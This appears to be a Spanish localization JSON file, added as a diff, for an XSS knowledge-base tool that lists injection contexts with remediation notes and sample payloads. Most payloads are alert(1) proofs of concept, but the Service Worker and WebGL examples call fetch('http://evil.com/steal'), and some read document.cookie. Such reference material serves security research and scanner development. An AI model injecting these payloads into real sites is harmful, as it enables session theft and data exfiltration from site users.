@@ -1,0 +1,331 @@
+{
+  "app": {
+    "name": "BRS-KB Base de Conocimientos XSS",
+    "description": "Base de datos avanzada de inteligencia XSS para investigadores y escáneres",
+    "version": "Versión",
+    "loading": "Cargando...",
+    "error": "Error",
+    "success": "Éxito",
+    "warning": "Advertencia",
+    "info": "Información"
+  },
+  "navigation": {
+    "home": "Inicio",
+    "contexts": "Contextos",
+    "payloads": "Cargas útiles",
+    "playground": "Terreno de juegos",
+    "dashboard": "Panel",
+    "api_docs": "Documentación API"
+  },
+  "contexts": {
+    "title": "Contextos de Vulnerabilidades XSS",
+    "description": "Explore diferentes contextos de vulnerabilidades XSS con vectores de ataque detallados y estrategias de remediación.",
+    "severity": "Severidad",
+    "cvss_score": "Puntuación CVSS",
+    "description": "Descripción",
+    "attack_vector": "Vector de ataque",
+    "remediation": "Remediación",
+    "examples": "Ejemplos",
+    "payload_count": "Cantidad de payloads"
+  },
+  "context_details": {
+    "html_content": {
+      "title": "Secuencias de comandos en sitios cruzados (XSS) en contenido HTML",
+      "description": "La entrada del usuario se refleja directamente en el cuerpo HTML sin sanitización adecuada...",
+      "attack_vector": "VECTORES DE ATAQUE CLÁSICOS:\n\n1. INYECCIÓN DE ETIQUETA SCRIPT:\n   <script>alert(document.cookie)</script>...",
+      "remediation": "ESTRATEGIA DE DEFENSA EN PROFUNDIDAD:\n\n1. CODIFICACIÓN DE SALIDA (DEFENSA PRINCIPAL):\n   Codificación de entidades HTML...",
+      "examples": [
+        {"name": "Script básico", "payload": "<script>alert('XSS')</script>"},
+        {"name": "Error de imagen", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "websocket_xss": {
+      "title": "XSS en contexto WebSocket",
+      "description": "WebSocket XSS ocurre cuando la entrada del usuario se refleja en mensajes WebSocket...",
+      "attack_vector": "VECTORES DE ATAQUE WEBSOCKET XSS:\n\n1. INYECCIÓN DE MENSAJE:\n   Servidor envía: ws.send(userMessage)...",
+      "remediation": "ESTRATEGIA DE DEFENSA WEBSOCKET XSS:\n\n1. SANITIZACIÓN DE MENSAJES:\n   Sanitizar todos los mensajes salientes de WebSocket...",
+      "examples": [
+        {"name": "Mensaje de chat", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "Nombre de usuario", "payload": "{\"type\": \"user_joined\", \"username\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "service_worker_xss": {
+      "title": "XSS en contexto Service Worker",
+      "description": "Service Worker XSS ocurre cuando la entrada del usuario se refleja en scripts de Service Worker...",
+      "attack_vector": "VECTORES DE ATAQUE SERVICE WORKER XSS:\n\n1. REGISTRO DINÁMICO:\n   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT)...",
+      "remediation": "ESTRATEGIA DE DEFENSA SERVICE WORKER XSS:\n\n1. VALIDACIÓN DE URL:\n   Validar URL de registro de Service Worker...",
+      "examples": [
+        {"name": "Inyección de caché", "payload": "data:text/javascript,self.addEventListener(\"install\",function(){fetch(\"http://evil.com/steal\")})"},
+        {"name": "XSS offline", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "webrtc_xss": {
+      "title": "XSS en contexto WebRTC",
+      "description": "WebRTC XSS ocurre cuando la entrada del usuario se refleja en canales de datos WebRTC...",
+      "attack_vector": "VECTORES DE ATAQUE WEBRTC XSS:\n\n1. INYECCIÓN DE DATOS DE CANAL:\n   WebRTC data channel: dataChannel.send(JSON.stringify({...",
+      "remediation": "ESTRATEGIA DE DEFENSA WEBRTC XSS:\n\n1. VALIDACIÓN DE DATOS DE CANAL:\n   Validar mensajes de canal de datos...",
+      "examples": [
+        {"name": "Mensaje de canal", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "Información de par", "payload": "{\"type\": \"peer_info\", \"name\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "graphql_xss": {
+      "title": "XSS en contexto GraphQL",
+      "description": "GraphQL XSS ocurre cuando la entrada del usuario se refleja en consultas GraphQL...",
+      "attack_vector": "VECTORES DE ATAQUE GRAPHQL XSS:\n\n1. INYECCIÓN DE PARÁMETRO DE CONSULTA:\n   query GetUser($id: ID!) { user(id: $id) {...",
+      "remediation": "ESTRATEGIA DE DEFENSA GRAPHQL XSS:\n\n1. VALIDACIÓN DE ENTRADA:\n   Validar todas las entradas GraphQL...",
+      "examples": [
+        {"name": "Consulta GraphQL", "payload": "query { user(id: \"<script>alert(1)</script>\") { name } }"},
+        {"name": "Mutación GraphQL", "payload": "mutation { updateProfile(input: { displayName: \"<script>alert(1)</script>\" }) { success } }"}
+      ]
+    },
+    "shadow_dom_xss": {
+      "title": "XSS en contexto Shadow DOM",
+      "description": "Shadow DOM XSS ocurre cuando la entrada del usuario se refleja en elementos Shadow DOM...",
+      "attack_vector": "VECTORES DE ATAQUE SHADOW DOM XSS:\n\n1. INYECCIÓN DE CONTENIDO DE SLOT:\n   <user-profile><span slot=\"name\">USER_INPUT</span></user-profile>",
+      "remediation": "ESTRATEGIA DE DEFENSA SHADOW DOM XSS:\n\n1. SANITIZACIÓN DE CONTENIDO:\n   Sanitizar todo el contenido antes de insertar en Shadow DOM...",
+      "examples": [
+        {"name": "Slot Shadow DOM", "payload": "<span slot=\"content\"><script>alert(1)</script></span>"},
+        {"name": "Atributo Shadow DOM", "payload": "<my-component title=\"<script>alert(1)</script>\"></my-component>"}
+      ]
+    },
+    "custom_elements_xss": {
+      "title": "XSS en contexto de elementos personalizados",
+      "description": "Los elementos personalizados XSS ocurren cuando la entrada del usuario se refleja en elementos personalizados...",
+      "attack_vector": "VECTORES DE ATAQUE DE ELEMENTOS PERSONALIZADOS XSS:\n\n1. INYECCIÓN DE NOMBRE DE ELEMENTO:\n   customElements.define(USER_INPUT, MyComponent)...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE ELEMENTOS PERSONALIZADOS XSS:\n\n1. VALIDACIÓN DE NOMBRE DE ELEMENTO:\n   Validar nombres de elementos personalizados...",
+      "examples": [
+        {"name": "Nombre de elemento", "payload": "<script>alert(1)</script>"},
+        {"name": "Atributo de elemento", "payload": "<my-component data-value='<script>alert(1)</script>'></my-component>"}
+      ]
+    },
+    "http2_push_xss": {
+      "title": "XSS en contexto de push HTTP/2",
+      "description": "HTTP/2 Push XSS ocurre cuando la entrada del usuario se refleja en recursos de push HTTP/2...",
+      "attack_vector": "VECTORES DE ATAQUE DE PUSH HTTP/2 XSS:\n\n1. INYECCIÓN DE RUTA DE PUSH:\n   server.push('/api/user/' + USER_INPUT)...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE PUSH HTTP/2 XSS:\n\n1. VALIDACIÓN DE RUTA DE PUSH:\n   Validar todas las rutas de push...",
+      "examples": [
+        {"name": "Ruta de push", "payload": "/api/user/<script>alert(1)</script>"},
+        {"name": "Contenido de push", "payload": "var userName = \"<script>alert(1)</script>\";"}
+      ]
+    },
+    "iframe_sandbox_xss": {
+      "title": "XSS en contexto de sandbox de iframe",
+      "description": "iframe Sandbox XSS ocurre cuando las restricciones de sandbox se bypassan...",
+      "attack_vector": "VECTORES DE ATAQUE DE SANDBOX DE IFRAME XSS:\n\n1. SANDBOX INCOMPLETO:\n   <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts\"></iframe>...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE SANDBOX DE IFRAME XSS:\n\n1. SANDBOX ESTRICTO:\n   Usar política de sandbox estricta...",
+      "examples": [
+        {"name": "URI de datos", "payload": "<iframe src='data:text/html,<script>alert(1)</script>' sandbox='allow-scripts'></iframe>"},
+        {"name": "Mismo origen", "payload": "<iframe src='/same-origin' sandbox='allow-same-origin allow-scripts'></iframe>"}
+      ]
+    },
+    "indexeddb_xss": {
+      "title": "XSS en contexto IndexedDB",
+      "description": "IndexedDB XSS ocurre cuando la entrada del usuario se refleja en almacenamiento IndexedDB...",
+      "attack_vector": "VECTORES DE ATAQUE INDEXEDDB XSS:\n\n1. INYECCIÓN DE ALMACENAMIENTO:\n   store.add({id: userId, name: USER_INPUT})...",
+      "remediation": "ESTRATEGIA DE DEFENSA INDEXEDDB XSS:\n\n1. SANITIZACIÓN DE ALMACENAMIENTO:\n   Sanitizar todos los datos antes del almacenamiento...",
+      "examples": [
+        {"name": "Perfil de usuario", "payload": "{\"name\": \"<script>alert(1)</script>\", \"email\": \"test@example.com\"}"},
+        {"name": "Almacenamiento de mensajes", "payload": "{\"content\": \"<script>alert(1)</script>\", \"type\": \"text\"}"}
+      ]
+    },
+    "webgl_xss": {
+      "title": "XSS en contexto WebGL",
+      "description": "WebGL XSS ocurre cuando la entrada del usuario se refleja en shaders WebGL...",
+      "attack_vector": "VECTORES DE ATAQUE WEBGL XSS:\n\n1. INYECCIÓN DE SHADER:\n   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' + USER_INPUT...",
+      "remediation": "ESTRATEGIA DE DEFENSA WEBGL XSS:\n\n1. VALIDACIÓN DE SHADER:\n   Validar todo el código de shader...",
+      "examples": [
+        {"name": "Shader de vértice", "payload": "gl_Position = uModelViewMatrix * aVertexPosition; alert(1);"},
+        {"name": "Shader de fragmento", "payload": "gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch('http://evil.com/steal')"}
+      ]
+    },
+    "css_context": {
+      "title": "XSS en contexto CSS",
+      "description": "CSS XSS ocurre cuando la entrada del usuario se refleja en estilos CSS...",
+      "attack_vector": "VECTORES DE ATAQUE CSS XSS:\n\n1. EXPRESIÓN CSS:\n   expression(alert(1))...",
+      "remediation": "ESTRATEGIA DE DEFENSA CSS XSS:\n\n1. VALIDACIÓN CSS:\n   Validar todas las propiedades CSS...",
+      "examples": [
+        {"name": "Expresión CSS", "payload": "expression(alert(1))"},
+        {"name": "URL CSS", "payload": "background:url('javascript:alert(1)')"}
+      ]
+    },
+    "svg_context": {
+      "title": "XSS en contexto SVG",
+      "description": "SVG XSS ocurre cuando la entrada del usuario se refleja en elementos SVG...",
+      "attack_vector": "VECTORES DE ATAQUE SVG XSS:\n\n1. SVG ONLOAD:\n   <svg onload=alert(1)>...",
+      "remediation": "ESTRATEGIA DE DEFENSA SVG XSS:\n\n1. SANITIZACIÓN SVG:\n   Sanitizar todos los elementos SVG...",
+      "examples": [
+        {"name": "SVG onload", "payload": "<svg onload=alert(1)>"},
+        {"name": "Script SVG", "payload": "<svg><script>alert(1)</script></svg>"}
+      ]
+    },
+    "markdown_context": {
+      "title": "XSS en contexto Markdown",
+      "description": "Markdown XSS ocurre cuando la entrada del usuario se refleja en renderizado Markdown...",
+      "attack_vector": "VECTORES DE ATAQUE MARKDOWN XSS:\n\n1. ENLACE MARKDOWN:\n   [XSS](javascript:alert(1))...",
+      "remediation": "ESTRATEGIA DE DEFENSA MARKDOWN XSS:\n\n1. SANITIZACIÓN MARKDOWN:\n   Sanitizar todos los elementos Markdown...",
+      "examples": [
+        {"name": "Enlace Markdown", "payload": "[XSS](javascript:alert(1))"},
+        {"name": "Imagen Markdown", "payload": "![XSS](javascript:alert(1))"}
+      ]
+    },
+    "json_value": {
+      "title": "XSS en contexto JSON",
+      "description": "JSON XSS ocurre cuando la entrada del usuario se refleja en datos JSON...",
+      "attack_vector": "VECTORES DE ATAQUE JSON XSS:\n\n1. INYECCIÓN JSON:\n   {\"user\": \"<script>alert(1)</script>\"}...",
+      "remediation": "ESTRATEGIA DE DEFENSA JSON XSS:\n\n1. VALIDACIÓN JSON:\n   Validar todos los datos JSON...",
+      "examples": [
+        {"name": "Valor JSON", "payload": "{\"user\": \"<script>alert(1)</script>\"}"},
+        {"name": "Objeto JSON", "payload": "{\"data\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "xml_content": {
+      "title": "XSS en contexto XML",
+      "description": "XML XSS ocurre cuando la entrada del usuario se refleja en datos XML...",
+      "attack_vector": "VECTORES DE ATAQUE XML XSS:\n\n1. INYECCIÓN XML:\n   <user><name><script>alert(1)</script></name></user>...",
+      "remediation": "ESTRATEGIA DE DEFENSA XML XSS:\n\n1. SANITIZACIÓN XML:\n   Sanitizar todos los elementos XML...",
+      "examples": [
+        {"name": "Contenido XML", "payload": "<user><name><script>alert(1)</script></name></user>"},
+        {"name": "CDATA XML", "payload": "<content><![CDATA[<script>alert(1)</script>]]></content>"}
+      ]
+    },
+    "url_context": {
+      "title": "XSS en contexto URL",
+      "description": "URL XSS ocurre cuando la entrada del usuario se refleja en URL...",
+      "attack_vector": "VECTORES DE ATAQUE URL XSS:\n\n1. PROTOCOLO JAVASCRIPT:\n   javascript:alert(1)...",
+      "remediation": "ESTRATEGIA DE DEFENSA URL XSS:\n\n1. VALIDACIÓN URL:\n   Validar todos los parámetros URL...",
+      "examples": [
+        {"name": "Protocolo JavaScript", "payload": "javascript:alert(1)"},
+        {"name": "URI de datos", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "dom_xss": {
+      "title": "XSS en contexto DOM",
+      "description": "DOM XSS ocurre cuando la entrada del usuario se refleja en DOM...",
+      "attack_vector": "VECTORES DE ATAQUE DOM XSS:\n\n1. HASH DE UBICACIÓN:\n   location.hash...",
+      "remediation": "ESTRATEGIA DE DEFENSA DOM XSS:\n\n1. VALIDACIÓN DOM:\n   Validar todas las manipulaciones DOM...",
+      "examples": [
+        {"name": "Hash de ubicación", "payload": "location.hash"},
+        {"name": "URL del documento", "payload": "document.URL"}
+      ]
+    },
+    "template_injection": {
+      "title": "XSS en contexto de inyección de plantilla",
+      "description": "La inyección de plantilla XSS ocurre cuando la entrada del usuario se refleja en plantillas...",
+      "attack_vector": "VECTORES DE ATAQUE DE INYECCIÓN DE PLANTILLA XSS:\n\n1. ESCAPE DE SANDBOX DE PLANTILLA:\n   {{constructor.constructor('alert(1)')()}}...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE INYECCIÓN DE PLANTILLA XSS:\n\n1. SANDBOX DE PLANTILLA:\n   Usar sandbox de plantilla...",
+      "examples": [
+        {"name": "Inyección de plantilla", "payload": "{{constructor.constructor('alert(1)')()}}"},
+        {"name": "Inyección Angular", "payload": "{{7*7}}"}
+      ]
+    },
+    "postmessage_xss": {
+      "title": "XSS en contexto PostMessage",
+      "description": "PostMessage XSS ocurre cuando la entrada del usuario se refleja en API PostMessage...",
+      "attack_vector": "VECTORES DE ATAQUE POSTMESSAGE XSS:\n\n1. INYECCIÓN DE MENSAJE:\n   postMessage(userInput, '*')...",
+      "remediation": "ESTRATEGIA DE DEFENSA POSTMESSAGE XSS:\n\n1. VALIDACIÓN DE MENSAJE:\n   Validar todos los datos PostMessage...",
+      "examples": [
+        {"name": "Datos PostMessage", "payload": "{\"type\": \"message\", \"data\": \"<script>alert(1)</script>\"}"},
+        {"name": "Fuente PostMessage", "payload": "{\"source\": \"javascript:alert(1)\", \"data\": \"message\"}"}
+      ]
+    },
+    "wasm_context": {
+      "title": "XSS en contexto WebAssembly",
+      "description": "WebAssembly XSS ocurre cuando la entrada del usuario se refleja en código WebAssembly...",
+      "attack_vector": "VECTORES DE ATAQUE WASM XSS:\n\n1. INYECCIÓN WASM:\n   (module (func $xss (export \"xss\") (call $alert)))...",
+      "remediation": "ESTRATEGIA DE DEFENSA WASM XSS:\n\n1. VALIDACIÓN WASM:\n   Validar todo el código WebAssembly...",
+      "examples": [
+        {"name": "Importación WASM", "payload": "(import \"env\" \"alert\" (func $alert))"},
+        {"name": "Global WASM", "payload": "(global $xss (mut i32) (i32.const 0)) (export \"xss\" (global $xss))"}
+      ]
+    },
+    "html_attribute": {
+      "title": "XSS en contexto de atributo HTML",
+      "description": "HTML Attribute XSS ocurre cuando la entrada del usuario se refleja en atributos HTML...",
+      "attack_vector": "VECTORES DE ATAQUE DE ATRIBUTO HTML XSS:\n\n1. INYECCIÓN DE ATRIBUTO:\n   <div data-text=\"USER_INPUT\">...</div>...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE ATRIBUTO HTML XSS:\n\n1. CODIFICACIÓN DE ATRIBUTO:\n   Codificar todos los atributos HTML...",
+      "examples": [
+        {"name": "Breakout de atributo", "payload": "\"><script>alert(1)</script>"},
+        {"name": "Imagen onerror", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "html_comment": {
+      "title": "XSS en contexto de comentario HTML",
+      "description": "HTML Comment XSS ocurre cuando la entrada del usuario se refleja en comentarios HTML...",
+      "attack_vector": "VECTORES DE ATAQUE DE COMENTARIO HTML XSS:\n\n1. BREAKOUT DE COMENTARIO:\n   <!-- USER_INPUT -->...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE COMENTARIO HTML XSS:\n\n1. SANITIZACIÓN DE COMENTARIO:\n   Sanitizar todos los comentarios HTML...",
+      "examples": [
+        {"name": "Breakout de comentario", "payload": "--><script>alert(1)</script><!--"},
+        {"name": "Comentario condicional", "payload": "<!--[if IE]><script>alert(1)</script><![endif]-->"}
+      ]
+    },
+    "javascript_context": {
+      "title": "XSS en contexto de JavaScript",
+      "description": "JavaScript Context XSS ocurre cuando la entrada del usuario se inyecta directamente en código JavaScript...",
+      "attack_vector": "VECTORES DE ATAQUE DE CONTEXTO JAVASCRIPT XSS:\n\n1. INYECCIÓN DE VARIABLE:\n   var data = USER_INPUT;...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE CONTEXTO JAVASCRIPT XSS:\n\n1. SERIALIZACIÓN JSON:\n   Usar serialización JSON para variables JavaScript...",
+      "examples": [
+        {"name": "Inyección de variable", "payload": "1; alert(document.cookie); var x=1"},
+        {"name": "Inyección de función", "payload": "1); alert(1); doSomething(1"}
+      ]
+    },
+    "js_string": {
+      "title": "XSS en contexto de cadena JavaScript",
+      "description": "JavaScript String XSS ocurre cuando la entrada del usuario se refleja en cadenas JavaScript...",
+      "attack_vector": "VECTORES DE ATAQUE DE CADENA JS XSS:\n\n1. CONCATENACIÓN DE CADENA:\n   var message = 'Hello ' + USER_INPUT...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE CADENA JS XSS:\n\n1. CODIFICACIÓN DE CADENA:\n   Codificar todas las cadenas JavaScript...",
+      "examples": [
+        {"name": "Concatenación de cadena", "payload": "' + alert(1) + '"},
+        {"name": "Literal de plantilla", "payload": "`${alert(1)}`"}
+      ]
+    },
+    "js_object": {
+      "title": "XSS en contexto de objeto JavaScript",
+      "description": "JavaScript Object XSS ocurre cuando la entrada del usuario se refleja en objetos JavaScript...",
+      "attack_vector": "VECTORES DE ATAQUE DE OBJETO JS XSS:\n\n1. INYECCIÓN DE PROPIEDAD DE OBJETO:\n   var config = {value: USER_INPUT}...",
+      "remediation": "ESTRATEGIA DE DEFENSA DE OBJETO JS XSS:\n\n1. VALIDACIÓN DE OBJETO:\n   Validar todas las propiedades de objetos...",
+      "examples": [
+        {"name": "Propiedad de objeto", "payload": "1, alert: alert(1), real: 1"},
+        {"name": "Inyección de objeto", "payload": "null}; alert(1); var config = {value: null"}
+      ]
+    },
+    "default": {
+      "title": "Vulnerabilidad XSS",
+      "description": "Información general sobre vulnerabilidades XSS...",
+      "attack_vector": "VECTORES DE ATAQUE XSS GENERALES:\n\n1. INYECCIÓN DE SCRIPT:\n   <script>alert('XSS')</script>...",
+      "remediation": "ESTRATEGIA DE DEFENSA XSS GENERAL:\n\n1. VALIDACIÓN DE ENTRADA:\n   Validar todos los datos de entrada...",
+      "examples": [
+        {"name": "XSS básico", "payload": "<script>alert('XSS')</script>"},
+        {"name": "XSS de imagen", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    }
+  },
+  "common": {
+    "loading": "Cargando...",
+    "error": "Error",
+    "success": "Éxito",
+    "warning": "Advertencia",
+    "info": "Información",
+    "search": "Buscar",
+    "filter": "Filtrar",
+    "clear": "Limpiar",
+    "export": "Exportar",
+    "import": "Importar",
+    "save": "Guardar",
+    "cancel": "Cancelar",
+    "confirm": "Confirmar",
+    "yes": "Sí",
+    "no": "No",
+    "total": "Total",
+    "contexts": "Contextos",
+    "payloads": "Cargas útiles",
+    "severity": "Severidad",
+    "cvss_score": "Puntuación CVSS",
+    "description": "Descripción",
+    "attack_vector": "Vector de ataque",
+    "remediation": "Remediación",
+    "examples": "Ejemplos",
+    "payload_count": "Cantidad de payloads"
+  }
+}
+
